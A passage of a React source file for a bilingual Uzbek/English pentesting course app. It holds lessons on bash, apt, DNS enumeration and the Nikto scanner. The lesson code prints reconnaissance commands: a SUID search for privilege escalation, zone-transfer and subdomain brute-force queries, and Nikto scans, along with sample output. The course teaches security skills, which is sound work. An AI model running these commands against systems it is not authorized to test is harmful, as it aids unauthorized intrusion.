        React.createElement("div",{style:{maxWidth:"88%",padding:"7px 11px",borderRadius:m.role==="user"?"10px 10px 3px 10px":"10px 10px 10px 3px",background:m.role==="user"?"var(--accent)":m.isErr?"rgba(255,80,80,0.1)":"var(--surface)",border:m.role==="user"?"none":`1px solid ${m.isErr?"rgba(255,80,80,0.3)":"var(--border)"}`,color:m.role==="user"?"#04060d":m.isErr?"#ff6666":"var(--text-0)",fontSize:12,lineHeight:1.6,whiteSpace:"pre-wrap",wordBreak:"break-word"}},m.text)
      )),
      loading&&React.createElement("div",{style:{marginBottom:8}},React.createElement("div",{style:{padding:"7px 12px",borderRadius:"10px 10px 10px 3px",background:"var(--surface)",border:"1px solid var(--border)",fontSize:14,color:"var(--text-3)",letterSpacing:2}},"···")),
      React.createElement("div",{ref:btm,style:{height:12}})
    ),
    React.createElement("div",{style:{padding:"8px 10px",borderTop:"1px solid var(--border)",display:"flex",gap:6}},
      React.createElement("input",{value:inp,onChange:e=>setInp(e.target.value),onKeyDown:e=>{if(e.key==="Enter"&&!e.shiftKey){e.preventDefault();send();}},placeholder:t(lang,"Savol bering…","Ask a question…"),
        style:{flex:1,background:"var(--bg-2)",border:"1px solid var(--border)",borderRadius:7,padding:"7px 10px",color:"var(--text-0)",fontSize:12,outline:"none"}}),
      React.createElement("button",{onClick:send,disabled:!inp.trim()||loading,style:{appearance:"none",border:"none",cursor:inp.trim()&&!loading?"pointer":"not-allowed",width:32,height:32,borderRadius:7,flexShrink:0,background:inp.trim()&&!loading?"var(--accent)":"var(--surface)",color:inp.trim()&&!loading?"#04060d":"var(--text-3)",display:"grid",placeItems:"center"}},
        React.createElement(Icon,{name:"send",size:13}))
    )
  );
}

// ── App Root ──────────────────────────────────────────────────
function App(){
  const [theme,_setTheme]=useState(()=>{try{return localStorage.getItem(THEME_KEY)||"violet";}catch{return"violet";}});
  const setTheme=v=>{_setTheme(v);try{localStorage.setItem(THEME_KEY,v);}catch{}};
  const [lang,_setLang]=useState(()=>{try{return localStorage.getItem(LANG_KEY)||"uz";}catch{return"uz";}});
  const setLang=v=>{_setLang(v);try{localStorage.setItem(LANG_KEY,v);}catch{}};
  const [progress,_setProgress]=useState(loadProgress);
  const updateProgress=useCallback(patch=>{_setProgress(p=>{const n={...p,...patch};saveProgress(n);return n;});},[]);
  const markComplete=useCallback(key=>{_setProgress(p=>{if((p.completedLessons||[]).includes(key))return p;const cl=[...(p.completedLessons||[]),key];const xp=(p.xp||0)+50;const n={...p,completedLessons:cl,xp,level:xpToLevel(xp)};saveProgress(n);return n;});},[]);
  const [route,_setRoute]=useState(()=>{try{const s=localStorage.getItem(ROUTE_KEY);if(s)return JSON.parse(s);}catch{}return"landing";});
  const setRoute=r=>{_setRoute(r);try{localStorage.setItem(ROUTE_KEY,JSON.stringify(r));}catch{};window.scrollTo({top:0,behavior:"instant"});};
  const [profileOpen,setProfileOpen]=useState(false);
  const [aiOpen,setAiOpen]=useState(false);

  useEffect(()=>{
    const th=theme;
    document.documentElement.setAttribute("data-theme",th);
    const colors={violet:"#a855f7",cyan:"#00d4ff",green:"#00ff88"};
    const c=colors[th]||colors.violet;
    const r=document.documentElement.style;
    r.setProperty("--accent",c);
    r.setProperty("--accent-glow",`${c}72`);
    r.setProperty("--accent-soft",`${c}1e`);
    r.setProperty("--accent-border",`${c}47`);
  },[theme]);

  const user={...progress,completedLessons:progress.completedLessons||[]};
  const routeName=typeof route==="string"?route:route?.name;
  const navProps={setRoute,user,setLang,onOpenProfile:()=>setProfileOpen(true),onOpenAI:()=>setAiOpen(true)};

  return React.createElement(LangCtx.Provider,{value:lang},
    React.createElement("div",null,
      routeName!=="landing"&&React.createElement(TopNav,navProps),
      routeName==="landing"?React.createElement(LandingScreen,{setRoute,setLang}):
      routeName==="dashboard"?React.createElement(DashboardScreen,{...navProps}):
      routeName==="section"?React.createElement(SectionScreen,{...navProps,sec:route?.sec||1}):
      routeName==="lesson"?React.createElement(LessonScreen,{...navProps,markComplete,num:route?.num||1}):
      React.createElement(LandingScreen,{setRoute,setLang}),
      profileOpen&&React.createElement(ProfileModal,{user,theme,setTheme,lang,onClose:()=>setProfileOpen(false),onSave:patch=>{updateProgress({name:patch.name});setProfileOpen(false);}}),
      React.createElement(AIChat,{open:aiOpen,onClose:()=>setAiOpen(false),lang})
    )
  );
}


// ── L03: Command line basics ──────────────────────────────────
function LessonL03(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Nega buyruq qatori?","Why the command line?")),
    React.createElement(P,null,t(lang,"Kali'da ishning 90% terminalda bajariladi. Buyruq qatori (CLI) grafik interfeysdan tezroq, avtomatlashtirishga qulay va masofaviy serverlarda (SSH orqali) ko'pincha yagona imkoniyat bo'ladi. Pentester uchun bash'ni bilish — sport zaliga borishdek asosiy ko'nikma: qanchalik ravon bo'lsangiz, shunchalik tez ishlaysiz.","About 90% of the work in Kali happens in the terminal. The command line (CLI) is faster than a GUI, easy to automate, and on remote servers (over SSH) is often the only option. For a pentester, knowing bash is a core skill like going to the gym: the more fluent you are, the faster you work.")),
    React.createElement(H2,{num:"§2"},t(lang,"Buyruq toifalari","Command categories")),
    React.createElement(LayerStack,{layers:[
      {n:"📁",name:t(lang,"Navigatsiya","Navigation"),color:"#4dabf7",desc:{uz:"pwd (qayerdaman), ls (nima bor), cd (o'tish).",en:"pwd (where am I), ls (what's here), cd (move)."}},
      {n:"✏",name:t(lang,"Fayl amallari","File operations"),color:"#69db7c",desc:{uz:"cp (nusxa), mv (ko'chirish/nom), rm (o'chirish), mkdir, touch.",en:"cp (copy), mv (move/rename), rm (delete), mkdir, touch."}},
      {n:"🔎",name:t(lang,"Qidirish","Searching"),color:"#a855f7",desc:{uz:"grep (matn ichidan), find (fayl nomi bo'yicha), locate.",en:"grep (inside text), find (by file name), locate."}},
      {n:"🔗",name:t(lang,"Quvur & yo'naltirish","Pipes & redirect"),color:"#ffd43b",desc:{uz:"| bilan buyruqlarni ulash, >/>> bilan faylga yozish.",en:"Chain commands with |, write to a file with >/>>."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Navigatsiya va fayllar chuqurroq","Navigation and files in depth")),
    React.createElement(P,null,t(lang,"ls oddiy ro'yxat beradi, lekin bayroqlar uni kuchaytiradi: ls -l batafsil ko'rinish (ruxsatlar, egasi, o'lcham, sana), ls -a yashirin fayllarni ham (nuqta bilan boshlanuvchilar), ls -lh o'lchamlarni o'qilishi qulay ko'rsatadi (KB/MB). cd .. bir daraja yuqoriga, cd ~ uy katalogiga, cd - oldingi katalogga qaytaradi. Bu kichik bayroqlar tezlikni sezilarli oshiradi.","ls gives a plain list, but flags supercharge it: ls -l is the detailed view (permissions, owner, size, date), ls -a shows hidden files too (those starting with a dot), ls -lh shows sizes in human-readable form (KB/MB). cd .. goes one level up, cd ~ to the home directory, cd - back to the previous directory. These small flags noticeably boost speed.")),
    React.createElement(H2,{num:"§4"},t(lang,"Fayllarni ko'rish","Viewing files")),
    React.createElement(P,null,t(lang,"Faylni ochishning bir necha usuli bor: cat butun faylni ekranga chiqaradi (kichik fayllar uchun); less faylni sahifalab ko'rsatadi (katta loglar uchun, o'q tugmalari bilan aylantiriladi); head -n 20 birinchi 20 qatorni, tail -n 20 oxirgi 20 qatorni beradi; tail -f faylni real vaqtda kuzatadi (loglarni jonli ko'rish uchun). Har biri o'z o'rnida foydali.","There are several ways to read a file: cat prints the whole file (for small files); less shows it page by page (for large logs, scroll with arrow keys); head -n 20 gives the first 20 lines, tail -n 20 the last 20; tail -f watches a file in real time (to see logs live). Each is useful in its place.")),
    React.createElement(H2,{num:"§5"},t(lang,"Quvur va yo'naltirish","Pipes and redirection")),
    React.createElement(P,null,t(lang,"Buyruqlarning haqiqiy kuchi ularni birlashtirishda. Quvur (|) bir buyruqning chiqishini boshqasining kirishiga uzatadi. > chiqishni faylga yozadi (eskisini o'chirib), >> faylga qo'shadi. 2> xatolarni alohida faylga, &> hammasini (chiqish+xato) bir faylga yo'naltiradi. Bu belgilar orqali murakkab ish oqimlarini bir qatorda quyasiz.","The real power of commands is in combining them. A pipe (|) sends one command's output into another's input. > writes output to a file (overwriting), >> appends. 2> redirects errors to a separate file, &> everything (output+errors) to one file. With these symbols you build complex workflows in a single line.")),
    React.createElement(H2,{num:"§6"},t(lang,"Interaktiv simulyator: qo'lda o'qish vs quvur bilan filtrlash","Interactive simulator: reading by hand vs filtering with a pipe")),
    React.createElement(P,null,t(lang,"Xuddi shu vazifani ikki usulda bajaring — 2000 qatorli auth.log faylida muvaffaqiyatsiz SSH urinishlarini sanash kerak:","Do the exact same task two ways — count the failed SSH attempts in a 2000-line auth.log file:")),
    React.createElement(ManualVsPipeSim),
    React.createElement(H2,{num:"§7"},t(lang,"Wildcard va yordam","Wildcards and help")),
    React.createElement(P,null,t(lang,"Wildcard'lar ko'p faylni bir vaqtda tanlaydi: * har qanday belgilar (*.txt — barcha .txt fayllar), ? bitta belgi, [abc] qavsdagi belgilardan biri. Yordam kerak bo'lsa: man buyruq to'liq qo'llanma, buyruq --help qisqa yordam, tldr buyruq sodda misollar beradi.","Wildcards select many files at once: * any characters (*.txt — all .txt files), ? one character, [abc] one of the bracketed characters. When you need help: man command is the full manual, command --help a short help, tldr command gives simple examples.")),
    React.createElement(Terminal,null,"# Ochiq portlarni sanab, faylga yozish\ncat scan.txt | grep open | wc -l\n\n# SUID fayllarni topib, xatolarni yashirish (privesc uchun)\nfind / -perm -4000 2>/dev/null > suid.txt\n\n# Barcha .conf fayllarni topish\nfind /etc -name \"*.conf\""),
    React.createElement(H2,{num:"§8"},t(lang,"Quvur qanday oqadi","How a pipe flows")),
    React.createElement(P,null,t(lang,"Quvur (|) chapdagi buyruqning chiqishini o'ngdagining kirishiga uzatadi. Bir necha quvurni ulab, ma'lumotni bosqichma-bosqich filtrlaydigan «konveyer» quramiz — bu bash'ning eng kuchli g'oyasi, xuddi simulyatordagi «Quvur bilan» ssenariysida ko'rganingizdek.","A pipe (|) sends the left command's output into the right command's input. By chaining several pipes we build a «conveyor» that filters data step by step — the most powerful idea in bash, just like the simulator's «With a pipe» scenario showed.")),
    React.createElement(FlowSteps,{color:"#ffd43b",title:{uz:"cat scan.txt | grep open | wc -l",en:"cat scan.txt | grep open | wc -l"},steps:[{icon:"📄",text:{uz:"cat — faylning barcha qatorlarini chiqaradi",en:"cat — emits all lines of the file"}},{icon:"🔎",text:{uz:"grep open — faqat «open» bor qatorlar",en:"grep open — only lines containing «open»"}},{icon:"🔢",text:{uz:"wc -l — qolgan qatorlarni sanaydi",en:"wc -l — counts the remaining lines"}},]}),
    React.createElement(H2,{num:"§9"},t(lang,"Amaliyot: haqiqiy natija","Practice: real output")),
    React.createElement(P,null,t(lang,"Quyidagi misolda ls -l batafsil ro'yxat beradi, so'ng uni grep bilan filtrlaymiz. Chiqishga qarab har bir bayroqning ta'sirini ko'rasiz.","In the example below ls -l gives a detailed listing, then we filter it with grep. From the output you can see the effect of each flag.")),
    React.createElement(Terminal,null,"ls -l /etc | head -3\n# total 1160\n# drwxr-xr-x  3 root root 4096 Jan  5 10:22 apache2\n# -rw-r--r--  1 root root 2981 Jan  5 10:20 passwd\n\nls /etc | grep -c conf\n# 42   (nomida «conf» bor fayllar soni)"),
    React.createElement(Quiz,{q:{uz:"Qaysi belgi bir buyruq chiqishini ikkinchisiga uzatadi?",en:"Which symbol sends one command's output into another?"},opts:[{uz:"> (yo'naltirish)",en:"> (redirect)"},{uz:"| (quvur)",en:"| (pipe)"},{uz:"& (fon)",en:"& (background)"},{uz:"# (izoh)",en:"# (comment)"}],correct:1,exp:{uz:"Quvur (|) birinchi buyruqning standart chiqishini ikkinchisining standart kirishiga uzatadi. > esa faylga yozadi.",en:"The pipe (|) connects the first command's stdout to the second's stdin. > writes to a file instead."}}));
}
function LessonL06(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"apt nima?","What is apt?")),
    React.createElement(P,null,t(lang,"Kali Debian asosida bo'lgani uchun dasturlarni apt (Advanced Package Tool) orqali o'rnatadi. apt — bu \"dastur do'koni\"ning buyruq qatoridagi ko'rinishi: u paketlarni markaziy omborlardan (repository) yuklab oladi, o'rnatadi, yangilaydi va o'chiradi. Eng muhimi — u bog'liqliklarni (dependencies) avtomatik hal qiladi: agar dastur boshqa kutubxonaga muhtoj bo'lsa, apt uni ham o'zi topib o'rnatadi.","Because Kali is Debian-based, it installs software via apt (Advanced Package Tool). apt is the command-line version of an \"app store\": it downloads packages from central repositories, installs, updates and removes them. Most importantly, it resolves dependencies automatically: if a program needs another library, apt finds and installs it too.")),
    React.createElement(H2,{num:"§2"},t(lang,"Paket o'rnatish oqimi","The package-install flow")),
    React.createElement(FlowSteps,{title:{uz:"apt bilan o'rnatish",en:"Installing with apt"},steps:[
      {icon:"🔄",text:{uz:"sudo apt update — paket ro'yxatini yangilash (avval!)",en:"sudo apt update — refresh the package list (first!)"}},
      {icon:"🔎",text:{uz:"apt search gobuster — kerakli paketni topish",en:"apt search gobuster — find the package"}},
      {icon:"⬇",text:{uz:"sudo apt install gobuster — o'rnatish (+ bog'liqliklar)",en:"sudo apt install gobuster — install (+ dependencies)"}},
      {icon:"✓",text:{uz:"which gobuster — o'rnatilganini tekshirish",en:"which gobuster — confirm it's installed"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"update va upgrade farqi","update vs upgrade")),
    React.createElement(P,null,t(lang,"Ko'p yangi boshlovchilar bu ikkisini chalkashtiradi. apt update — omborlardan yangi paket RO'YXATINI yuklab oladi (qanday versiyalar mavjudligini biladi), lekin hech narsani o'rnatmaydi. apt upgrade — o'rnatilgan paketlarni ro'yxatdagi yangi versiyalarga YANGILAYDI. Shuning uchun tartib muhim: avval update (ro'yxatni yangilash), keyin upgrade (haqiqiy yangilash). apt full-upgrade esa kerak bo'lsa eski paketlarni olib tashlab, chuqurroq yangilaydi.","Many beginners confuse these two. apt update downloads the new package LIST from the repositories (it learns what versions are available) but installs nothing. apt upgrade UPGRADES installed packages to the newer versions in that list. So order matters: update first (refresh the list), then upgrade (do the real update). apt full-upgrade goes deeper, removing old packages if needed.")),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: update'ni tashlab ketsangiz nima bo'ladi?","Interactive simulator: what happens if you skip update?")),
    React.createElement(P,null,t(lang,"Xuddi shu o'rnatish buyrug'ini ikki holatda sinang — bittasida update qadami tashlab ketilgan, ikkinchisida bajarilgan:","Try the exact same install command in two situations — one skips the update step, the other doesn't:")),
    React.createElement(AptUpdateSim),
    React.createElement(H2,{num:"§5"},t(lang,"Asosiy buyruqlar","Core commands")),
    React.createElement(P,null,t(lang,"install — o'rnatadi; remove — dasturni o'chiradi (sozlamalarni qoldiradi); purge — dasturni sozlamalari bilan to'liq o'chiradi; autoremove — endi kerak bo'lmagan bog'liqliklarni tozalaydi. search nom bo'yicha qidiradi, show esa paket haqida batafsil ma'lumot (versiya, o'lcham, tavsif) beradi. dpkg -l esa o'rnatilgan barcha paketlarni sanaydi.","install installs; remove deletes the program (leaving its config); purge fully removes the program with its config; autoremove cleans up dependencies no longer needed. search finds by name, show gives details about a package (version, size, description). dpkg -l lists all installed packages.")),
    React.createElement(H2,{num:"§6"},t(lang,"Omborlar va metapaketlar","Repositories and metapackages")),
    React.createElement(P,null,t(lang,"apt qayerdan paket olishini /etc/apt/sources.list fayli belgilaydi. Kali uchun faqat rasmiy Kali omborlaridan foydalaning — noma'lum manbalar tizimga zararli dastur olib kirishi mumkin. Kali barcha 600+ vositani birdan o'rnatishni talab qilmaydi: metapaketlar orqali kerakli to'plamni o'rnatasiz — kali-linux-large (ko'p vosita), kali-tools-web (faqat veb vositalar), kali-tools-wireless va h.k.","Where apt gets packages from is defined in /etc/apt/sources.list. For Kali, use only the official Kali repositories — unknown sources can bring malware into the system. Kali doesn't force you to install all 600+ tools at once: metapackages install a focused set — kali-linux-large (many tools), kali-tools-web (web tools only), kali-tools-wireless, and so on.")),
    React.createElement(Terminal,null,"sudo apt update && sudo apt full-upgrade -y\nsudo apt install nikto        # o'rnatish\nsudo apt purge nikto          # sozlamalari bilan o'chirish\nsudo apt autoremove           # keraksiz bog'liqliklarni tozalash\napt show nmap                 # paket haqida ma'lumot\nsudo apt install kali-tools-web   # metapaket"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"apt upgrade dan oldin DOIM apt update bajaring — aks holda apt eski ro'yxatdan foydalanadi va yangilanishlarni topa olmaydi yoki buzilgan bog'liqliklarga duch keladi.","Always run apt update before apt upgrade — otherwise apt uses a stale list and may miss updates or hit broken dependencies.")),
    React.createElement(H2,{num:"§7"},t(lang,"apt buyruqlari qatlamma-qatlam","The apt commands, layer by layer")),
    React.createElement(LayerStack,{layers:[{n:"update",name:t(lang,"update","update"),color:"#4dabf7",desc:{uz:"Paket ro'yxatini yangilaydi (dastur o'rnatmaydi).",en:"Refreshes the package list (installs nothing)."}},{n:"install",name:t(lang,"install","install"),color:"#69db7c",desc:{uz:"Paket va uning bog'liqliklarini o'rnatadi.",en:"Installs a package and its dependencies."}},{n:"upgrade",name:t(lang,"upgrade","upgrade"),color:"#ffd43b",desc:{uz:"O'rnatilgan paketlarni yangi versiyaga ko'taradi.",en:"Upgrades installed packages to newer versions."}},{n:"remove",name:t(lang,"remove","remove"),color:"#ff6b6b",desc:{uz:"Paketni o'chiradi (purge — sozlamalari bilan).",en:"Removes a package (purge — with its config)."}},]}),
    React.createElement(H2,{num:"§8"},t(lang,"Amaliyot: dastur o'rnatish","Practice: installing a tool")),
    React.createElement(P,null,t(lang,"Har doim avval update, keyin install — xuddi simulyatordagi «update, keyin install» ssenariysi kabi. Quyidagi natija gobuster o'rnatilishini ko'rsatadi — apt bog'liqliklarni avtomatik hal qiladi.","Always update first, then install — just like the simulator's «Update, then install» scenario. The output below shows gobuster being installed — apt resolves dependencies automatically.")),
    React.createElement(Terminal,null,"sudo apt update\n# Get:1 http://http.kali.org/kali kali-rolling InRelease\n# Reading package lists... Done\nsudo apt install -y gobuster\n# The following NEW packages will be installed: gobuster\n# Unpacking gobuster ... Setting up gobuster ... done"),
    React.createElement(Quiz,{q:{uz:"Yangi dastur o'rnatishdan oldin qaysi buyruqni bajarish kerak?",en:"Which command should you run before installing a new package?"},opts:[{uz:"apt remove",en:"apt remove"},{uz:"apt update",en:"apt update"},{uz:"apt clean",en:"apt clean"},{uz:"apt purge",en:"apt purge"}],correct:1,exp:{uz:"apt update paket ro'yxatini yangilaydi — shundan keyingina apt to'g'ri (eng so'nggi) versiyani topib o'rnatadi.",en:"apt update refreshes the package list — only then can apt find and install the correct (latest) version."}}));
}
function LessonL14(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"DNS enumeratsiya nima uchun?","Why DNS enumeration?")),
    React.createElement(P,null,t(lang,"DNS — internetning telefon kitobi. Enumeratsiyada nishon domenning subdomenlarini, pochta serverlarini (MX), nom serverlarini (NS) va IP manzillarini to'playmiz. Nega? Chunki har bir subdomen (masalan mail.example.com, dev.example.com, vpn.example.com) yangi hujum yuzasi — ko'pincha kompaniyalar asosiy saytini yaxshi himoya qiladi, lekin unutilgan test yoki eski subdomenlar zaif qoladi.","DNS is the internet's phone book. In enumeration we collect a target domain's subdomains, mail servers (MX), name servers (NS) and IP addresses. Why? Because every subdomain (e.g. mail.example.com, dev.example.com, vpn.example.com) is a new attack surface — companies often protect their main site well, but forgotten test or legacy subdomains stay weak.")),
    React.createElement(H2,{num:"§2"},t(lang,"Enumeratsiya oqimi","Enumeration flow")),
    React.createElement(FlowSteps,{title:{uz:"DNS enumeratsiya",en:"DNS enumeration"},steps:[
      {icon:"📇",text:{uz:"Asosiy yozuvlar: dig A, MX, NS",en:"Basic records: dig A, MX, NS"}},
      {icon:"🔓",text:{uz:"Zona transferini sinash (AXFR) — ochiq bo'lsa oltin",en:"Try a zone transfer (AXFR) — a goldmine if open"}},
      {icon:"🧩",text:{uz:"Subdomenlarni brute-force qilish (lug'at bilan)",en:"Brute-force subdomains (with a wordlist)"}},
      {icon:"🗺",text:{uz:"Barcha topilgan xost/IP ni xaritalash",en:"Map all discovered hosts/IPs"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"DNS yozuv turlari","DNS record types")),
    React.createElement(P,null,t(lang,"Har yozuv turi boshqacha ma'lumot beradi: A — domenni IPv4 ga bog'laydi (asosiy); AAAA — IPv6 ga; MX — pochta serverlarini ko'rsatadi (fishing hujumlari uchun foydali); NS — domenni boshqaruvchi nom serverlari; CNAME — bir nomni boshqasiga taxallus qiladi (ko'pincha bulut xizmatlarini ochib beradi); TXT — matn yozuvlari (SPF, DKIM kabi xavfsizlik sozlamalari, ba'zan maxfiy ma'lumot). Bularning har biri nishon infratuzilmasi haqida yangi tafsilot beradi.","Each record type gives different information: A — maps the domain to IPv4 (the main one); AAAA — to IPv6; MX — points to the mail servers (useful for phishing); NS — the name servers running the domain; CNAME — aliases one name to another (often revealing cloud services); TXT — text records (security settings like SPF, DKIM, sometimes sensitive data). Each of these adds a new detail about the target's infrastructure.")),
    React.createElement(H2,{num:"§4"},t(lang,"Zona transferi va brute-force","Zone transfer and brute-force")),
    React.createElement(P,null,t(lang,"Ikki asosiy usul bor. Zona transferi (AXFR) — noto'g'ri sozlangan DNS serverdan butun zonani (barcha yozuvlarni) bir so'rovda so'rash. Ochiq AXFR — jiddiy noto'g'ri konfiguratsiya va oltin ma'lumot manbasi, lekin bugun kam uchraydi. Brute-force esa lug'atdagi har bir so'zni domen oldiga qo'yib sinaydi (dev, test, admin, vpn...) — bu ko'proq ishlaydi. dnsenum, dnsrecon, fierce va gobuster dns bu vositalar sirasiga kiradi.","There are two main approaches. Zone transfer (AXFR) — asking a misconfigured DNS server for the entire zone (all records) in one request. An open AXFR is a serious misconfiguration and a goldmine, but rare today. Brute-force tries each word from a wordlist prefixed to the domain (dev, test, admin, vpn...) — this works more often. dnsenum, dnsrecon, fierce and gobuster dns are tools for this.")),
    React.createElement(Terminal,null,"dig example.com A\ndig example.com MX\ndig axfr @ns1.example.com example.com   # zona transfer\ndnsenum example.com\ndnsrecon -d example.com -t brt -D /usr/share/wordlists/subdomains.txt"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"DNS enumeratsiyani faqat sizga tegishli yoki ruxsat berilgan domenlarda o'tkazing.","Only perform DNS enumeration on domains you own or are authorized to test.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: AXFR ochiq yoki yopiqmi?","Interactive simulator: is AXFR open or restricted?")),
    React.createElement(P,null,t(lang,"Xuddi shu zona-transfer so'rovi ikki xil sozlangan serverda qanday farqli tugashini ko'ring:","See how the exact same zone-transfer request ends very differently against two differently configured servers:")),
    React.createElement(AXFRSim),
    React.createElement(H2,{num:"§6"},t(lang,"Amaliyot: yozuvlarni so'rash","Practice: querying records")),
    React.createElement(P,null,t(lang,"dig bilan alohida yozuvlarni, dnsenum bilan avtomatik enumeratsiyani bajarasiz. AXFR (zona transferi) muvaffaqiyatli bo'lsa — butun domen tuzilishi qo'lga tushadi, xuddi simulyatordagi «Ochiq AXFR» ssenariysidek.","With dig you query individual records, with dnsenum you run automated enumeration. If AXFR (zone transfer) succeeds, the whole domain structure is captured — just like the simulator's «Open AXFR» scenario.")),
    React.createElement(Terminal,null,"dig example.com MX +short\n# 10 mail.example.com.\ndig axfr @ns1.example.com example.com\n# ; agar ruxsat berilgan bo'lsa — BARCHA yozuvlar chiqadi (xato konfiguratsiya)\ndnsenum example.com"),
    React.createElement(Quiz,{q:{uz:"Noto'g'ri sozlangan DNS serverdan butun zona yozuvlarini olish urinishi qanday ataladi?",en:"Pulling all zone records from a misconfigured DNS server is called?"},opts:[{uz:"Zona transferi (AXFR)",en:"Zone transfer (AXFR)"},{uz:"Reverse lookup",en:"Reverse lookup"},{uz:"Cache poisoning",en:"Cache poisoning"},{uz:"DNS tunneling",en:"DNS tunneling"}],correct:0,exp:{uz:"Zona transferi (AXFR) domenning barcha DNS yozuvlarini bir so'rovda oladi; ochiq AXFR jiddiy zaiflik hisoblanadi.",en:"A zone transfer (AXFR) retrieves all of a domain's DNS records in one request; an open AXFR is a serious vulnerability."}}));
}
function LessonL16(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Nikto nima?","What is Nikto?")),
    React.createElement(P,null,t(lang,"Nikto — ochiq kodli veb-server skaneri. U 6700 dan ortiq potentsial xavfli fayl va dasturni, eskirgan server versiyalarini va noto'g'ri konfiguratsiyalarni tekshiradi. Uni veb-serverga qarshi \"tez tibbiy ko'rik\" deb tasavvur qiling: bir necha daqiqada ma'lum muammolar ro'yxatini beradi. U tez, lekin \"shovqinli\" — yuzlab so'rov yuboradi, shuning uchun IDS/IPS uni oson aniqlaydi.","Nikto is an open-source web server scanner. It checks for 6700+ potentially dangerous files and programs, outdated server versions and misconfigurations. Think of it as a \"quick medical checkup\" against a web server: in minutes it gives a list of known issues. It's fast but \"noisy\" — it sends hundreds of requests, so IDS/IPS detect it easily.")),
    React.createElement(H2,{num:"§2"},t(lang,"Skan oqimi","Scan flow")),
    React.createElement(FlowSteps,{title:{uz:"Nikto skan",en:"Nikto scan"},steps:[
      {icon:"🎯",text:{uz:"Nishon veb-serverga ulanish",en:"Connect to the target web server"}},
      {icon:"🗂",text:{uz:"6700+ ma'lum xavfli yo'l/fayl sinovi",en:"Test 6700+ known dangerous paths/files"}},
      {icon:"🏷",text:{uz:"Server versiyasi va sarlavhalarni tekshirish",en:"Check server version and headers"}},
      {icon:"📋",text:{uz:"Topilmalar hisobotga yoziladi",en:"Findings written to a report"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Nikto nimalarni topadi?","What Nikto finds")),
    React.createElement(P,null,t(lang,"Nikto bir necha turdagi muammoni qidiradi: eskirgan server versiyalari (ma'lum CVE'lar bilan), xavfli standart fayllar (test sahifalari, admin panellari, zaxira nusxalari), noto'g'ri sozlangan sarlavhalar (yetishmayotgan xavfsizlik sarlavhalari), va ochiq qoldirilgan katalogar. Har topilma yonida ko'pincha unga tegishli OSVDB yoki CVE havolasi beriladi — bu keyingi tadqiqot uchun boshlang'ich nuqta.","Nikto looks for several kinds of issues: outdated server versions (with known CVEs), dangerous default files (test pages, admin panels, backups), misconfigured headers (missing security headers), and exposed directories. Each finding often comes with an OSVDB or CVE reference — a starting point for further research.")),
    React.createElement(H2,{num:"§4"},t(lang,"Sozlamalar va proksi","Options and proxy")),
    React.createElement(P,null,t(lang,"-Tuning bilan qaysi turdagi sinovlarni ishga tushirishni tanlaysiz (masalan faqat SQLi yoki fayl yuklash sinovlari) — bu tezlashtiradi va shovqinni kamaytiradi. -o report.html -Format htm bilan natijani chiroyli HTML hisobotga saqlaysiz. -useproxy bilan esa Nikto trafigini Burp Suite orqali o'tkazasiz — bu so'rovlarni qo'lda tahlil qilish uchun qulay.","With -Tuning you choose which test types to run (e.g. only SQLi or file-upload tests) — this speeds it up and reduces noise. With -o report.html -Format htm you save results to a nice HTML report. With -useproxy you route Nikto's traffic through Burp Suite — handy for analyzing the requests by hand.")),
    React.createElement(Terminal,null,"nikto -h http://target.com\nnikto -h target.com -p 8080 -ssl\nnikto -h target.com -Tuning 1234        # tanlangan sinovlar\nnikto -h target.com -o report.html -Format htm\nnikto -h target.com -useproxy http://127.0.0.1:8080  # Burp orqali"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Nikto ni faqat sizga tegishli yoki yozma ruxsat berilgan tizimlarda ishlating. Ruxsatsiz skanerlash ko'p mamlakatda qonunga zid.","Only use Nikto on systems you own or are authorized to test. Unauthorized scanning is illegal in many countries.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: cheklovsiz skan WAF'ga uchraydi","Interactive simulator: an unfiltered scan meets a WAF")),
    React.createElement(P,null,t(lang,"Nikto «shovqinli» ekanini his qiling — xuddi shu veb-serverni cheklovsiz va -Tuning bilan skanerlashni solishtiring:","Feel just how «noisy» Nikto is — compare scanning the same web server unfiltered versus with -Tuning:")),
    React.createElement(NiktoTuningSim),
    React.createElement(H2,{num:"§6"},t(lang,"Amaliyot: veb-serverni skanerlash","Practice: scanning a web server")),
    React.createElement(P,null,t(lang,"Nikto veb-serverga yuzlab ma'lum zaiflik tekshiruvini yuboradi. U SHOVQINLI (loglarga ko'p yozadi), shuning uchun faqat ruxsat berilgan nishonlarda ishlating.","Nikto fires hundreds of known-vulnerability checks at a web server. It is NOISY (writes a lot to logs), so use it only on authorized targets.")),
    React.createElement(Terminal,null,"nikto -h http://10.0.0.5\n# + Server: Apache/2.4.29 (Ubuntu)\n# + The anti-clickjacking X-Frame-Options header is not present.\n# + OSVDB-3268: /admin/: Directory indexing found.\n# + /login.php: Admin login page found."),
